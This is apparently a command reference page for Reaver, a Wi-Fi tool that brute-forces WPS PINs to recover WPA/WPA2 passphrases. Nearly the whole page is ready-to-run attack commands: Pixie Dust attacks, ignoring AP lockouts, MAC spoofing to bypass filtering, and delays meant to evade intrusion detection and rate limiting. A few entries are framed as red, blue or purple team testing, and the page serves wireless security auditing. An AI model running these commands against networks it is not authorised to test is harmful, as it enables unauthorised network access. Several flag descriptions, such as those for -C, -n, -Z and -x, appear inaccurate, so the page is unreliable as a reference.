# Reaver

> Brute-forces WPS PINs to recover WPA/WPA2 passphrases from access points with vulnerable WPS implementations.

- Category: Wireless
- Commands: 45
- Page: https://terminal.rokibulroni.com/tool/wireless/reaver
- Homepage: https://github.com/t6x/reaver-wps-fork-t6x
- Tags: Wi-Fi, WPS, brute force

## Install

- apt: `sudo apt install reaver`

## Basic Syntax

### reaver --help

```bash
reaver --help
```

Displays the full list of available command line options and arguments


## Basic WPS Attack

### reaver -i wlan0mon -b 00:11:22:33:44:55

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55
```

Initiates a standard WPS PIN attack against a specific BSSID using the specified interface


## Target Specification

### reaver -i wlan0mon -b 00:11:22:33:44:55 -e 'CorpWifi'

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -e 'CorpWifi'
```

Targets a specific BSSID and verifies the ESSID matches before attacking to prevent errors


## Channel Control

### reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6
```

Locks the interface to channel 6 to improve stability and prevent channel hopping during the attack


## Output and Logging

### reaver -i wlan0mon -b 00:11:22:33:44:55 -v

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -v
```

Enables verbose output to display the current PIN being attempted and basic status updates

### reaver -i wlan0mon -b 00:11:22:33:44:55 -vv

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -vv
```

Enables very verbose output to show full debug information including M1-M7 message exchanges


## Association Control

### reaver -i wlan0mon -b 00:11:22:33:44:55 -A

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -A
```

Disables automatic association allows use when already associated via another tool


## Timing Control

### reaver -i wlan0mon -b 00:11:22:33:44:55 -d 5

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -d 5
```

Sets a 5-second delay between PIN attempts to evade basic intrusion detection systems

### reaver -i wlan0mon -b 00:11:22:33:44:55 -d 0

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -d 0
```

Removes the delay between PIN attempts for maximum speed in a controlled lab environment


## Lockout Handling

### reaver -i wlan0mon -b 00:11:22:33:44:55 -L

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -L
```

Ignores the WPS locked state reported by the AP and attempts to proceed with the attack

### reaver -i wlan0mon -b 00:11:22:33:44:55 -N

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -N
```

Does not send NACK messages when out of order packets are received to prevent AP lockouts


## Pixie Dust

### reaver -i wlan0mon -b 00:11:22:33:44:55 -K 1

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -K 1
```

Initiates a Pixie Dust attack using the wpa_supplicant-based approach to recover the PIN offline


## Manual PIN Testing

### reaver -i wlan0mon -b 00:11:22:33:44:55 -p 12345670

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -p 12345670
```

Attempts to validate a single specific PIN against the target access point

### reaver -i wlan0mon -b 00:11:22:33:44:55 -p 1234

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -p 1234
```

Attempts a partial PIN to test if the AP reveals the first half validity without full checksum


## Session Management

### reaver -i wlan0mon -b 00:11:22:33:44:55 -s session.wps

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -s session.wps
```

Saves or restores the attack session from a specific file to allow pausing and resuming


## Advanced Rate Limiting

### reaver -i wlan0mon -b 00:11:22:33:44:55 -l 60

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -l 60
```

Forces a 60-second lockout period if the AP enters a locked state

### reaver -i wlan0mon -b 00:11:22:33:44:55 -r 3:60

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -r 3:60
```

Sleeps for 60 seconds after every 3 consecutive PIN attempts to bypass rate limiting


## Timeout Handling

### reaver -i wlan0mon -b 00:11:22:33:44:55 -t 10

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -t 10
```

Sets the receive timeout period to 10 seconds to handle slow-responding access points

### reaver -i wlan0mon -b 00:11:22:33:44:55 -T 2

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -T 2
```

Sets the M5/M7 message timeout to 2 seconds to speed up failure detection on bad PINs


## Packet Manipulation

### reaver -i wlan0mon -b 00:11:22:33:44:55 -S

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -S
```

Uses small Diffie-Hellman keys to reduce CPU load on the testing device

### reaver -i wlan0mon -b 00:11:22:33:44:55 -m 00:11:22:33:44:66

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -m 00:11:22:33:44:66
```

Spoofs the source MAC address of the attacking interface to bypass MAC filtering

### reaver -i wlan0mon -b 00:11:22:33:44:55 -E

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -E
```

Uses the EAP-FAIL mechanism to terminate sessions cleanly


## Detection Evasion

### reaver -i wlan0mon -b 00:11:22:33:44:55 -x 20

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -x 20
```

Sets the timeout for WPS identity packets to 20 seconds to match specific AP behaviors


## Signal Handling

### reaver -i wlan0mon -b 00:11:22:33:44:55 -f

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -f
```

Disables channel hopping entirely even if the AP is not found on the locked channel


## Logging Workflow

### reaver -i wlan0mon -b 00:11:22:33:44:55 -o /tmp/reaver_audit.log

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -o /tmp/reaver_audit.log
```

Writes all output to a specified log file for evidence collection and audit trails


## Output Formatting

### reaver -i wlan0mon -b 00:11:22:33:44:55 -q

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -q
```

Runs in quiet mode printing only the recovered passphrase and critical errors


## Advanced Workflow

### reaver -i wlan0mon -b 00:11:22:33:44:55 -c 1 -vv -L -N -d 10 -T .5

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -c 1 -vv -L -N -d 10 -T .5
```

Combines lock ignoring, no-NACKs, and delays for stubborn older access points

### reaver -i wlan0mon -b 00:11:22:33:44:55 -c 11 -K 1 -vv

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -c 11 -K 1 -vv
```

Executes a verbose Pixie Dust attack on channel 11 to quickly identify vulnerable chipsets


## Red Team Simulation

### reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -S -N -vv -r 2:120

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -c 6 -S -N -vv -r 2:120
```

Simulates a low-and-slow attack attempting only 2 PINs every 2 minutes to test detection thresholds


## Blue Team Validation

### reaver -i wlan0mon -b 00:11:22:33:44:55 -p 00000000 -vv

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -p 00000000 -vv
```

Tests if the AP is vulnerable to default empty or zeroed PINs commonly found in factory settings

### reaver -i wlan0mon -b 00:11:22:33:44:55 -p 12345670 -vv

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -p 12345670 -vv
```

Validates if the AP correctly implements lockout after failed attempts using a known invalid PIN


## Purple Team Testing

### reaver -i wlan0mon -b 00:11:22:33:44:55 -d 0 -vv

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -d 0 -vv
```

Generates a noisy flood of PIN attempts to verify if the SIEM or WIPS triggers an alert


## Compatibility Mode

### reaver -i wlan0mon -b 00:11:22:33:44:55 --dh-small

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 --dh-small
```

Alternative syntax for small DH keys ensuring compatibility with specific constrained AP hardware


## Pin Enumeration

### reaver -i wlan0mon -b 00:11:22:33:44:55 -g 1

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -g 1
```

Stops the attack after 1 attempt usually combined with scripts to distribute attacks across multiple nodes


## Fail-Safe Operation

### reaver -i wlan0mon -b 00:11:22:33:44:55 -w

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -w
```

Mimics Windows 7 registrar behavior to interact with APs that block standard Reaver signatures


## Recovery Workflow

### reaver -i wlan0mon -b 00:11:22:33:44:55 -s old_session.wps

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -s old_session.wps
```

Restores a previous attack state from a specific session file to continue where it left off


## Maximum Verbosity

### reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -C

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -vv -C
```

Runs with verbose output and ignores FCS errors to debug weak signal issues


## Manual MAC Spoofing

### reaver -i wlan0mon -b 00:11:22:33:44:55 --mac=00:11:22:33:44:66

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 --mac=00:11:22:33:44:66
```

Explicitly sets the source MAC address for the WPS exchange transaction


## Packet Rate Control

### reaver -i wlan0mon -b 00:11:22:33:44:55 --win7

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 --win7
```

Alias for -w mimicking Windows 7 behavior to bypass simple OS fingerprinting on APs


## Advanced Delay

### reaver -i wlan0mon -b 00:11:22:33:44:55 --lock-delay=120

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 --lock-delay=120
```

Sets a custom 120-second wait time specifically when the AP reports a WPS locked state


## Full Automation Chain

### reaver -i wlan0mon -b 00:11:22:33:44:55 -c 1 -vv -L -N -w -S -d 15 -r 3:120

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -c 1 -vv -L -N -w -S -d 15 -r 3:120
```

Complex chain for highly secured APs combining evasion spoofing and extreme rate limiting


## Quick Audit

### reaver -i wlan0mon -b 00:11:22:33:44:55 -c 1 -K 1

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -c 1 -K 1
```

Perform a rapid Pixie Dust check on channel 1 without verbose output for quick triage


## Pin Recovery

### reaver -i wlan0mon -b 00:11:22:33:44:55 -p ''

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -p ''
```

Attempts to interact with the AP using an empty PIN string to test for null-pin vulnerabilities


## Infrastructure Testing

### reaver -i wlan0mon -b 00:11:22:33:44:55 -Z

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -Z
```

Auto-detects the best rate limiting strategy based on the AP's response patterns


## Verification

### reaver -i wlan0mon -b 00:11:22:33:44:55 -n

```bash
reaver -i wlan0mon -b 00:11:22:33:44:55 -n
```

Target the AP but do not actually send any PINs used for connectivity verification only

## Related tools

- [Bully](https://terminal.rokibulroni.com/tool/wireless/bully)
- [airodump-ng](https://terminal.rokibulroni.com/tool/wireless/airodump-ng)
